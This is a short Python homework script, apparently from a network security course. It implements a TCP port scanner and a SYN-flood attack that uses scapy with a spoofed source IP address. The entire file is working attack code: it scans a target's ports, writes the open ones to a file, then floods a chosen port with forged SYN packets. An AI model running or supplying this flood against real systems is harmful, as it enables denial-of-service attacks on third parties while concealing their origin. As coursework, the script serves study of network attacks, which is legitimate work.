#!/usr/bin/env python3

# Homework Number: 8
# Name: Elias Talcott
# ECN Login: etalcott
# Due Date: March 26, 2020

from scapy.all import *
import random

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        # Scan range for open ports
        openports = []
        for port in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            if sock.connect_ex((self.targetIP, port)) == 0:
                openports.append(port)
            sock.close()

        # Print open ports to a text file
        if openports:
            with open("openports.txt", "w") as fpout:
                fpout.writelines(str(port) + "\n" for port in openports[:-1])
                fpout.writelines(str(openports[-1]))

    def attackTarget(self, port, numSyn):
        # Check that target port is open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        if sock.connect_ex((self.targetIP, port)) != 0:
            sock.close()
            return 0
        sock.close()

        # Send numSyn SYN packets to target port from random source ports
        for _ in range(numSyn):
            send(IP(src = self.spoofIP, dst = self.targetIP)/TCP(sport = random.randint(1024, 65536), dport = port))
        return 1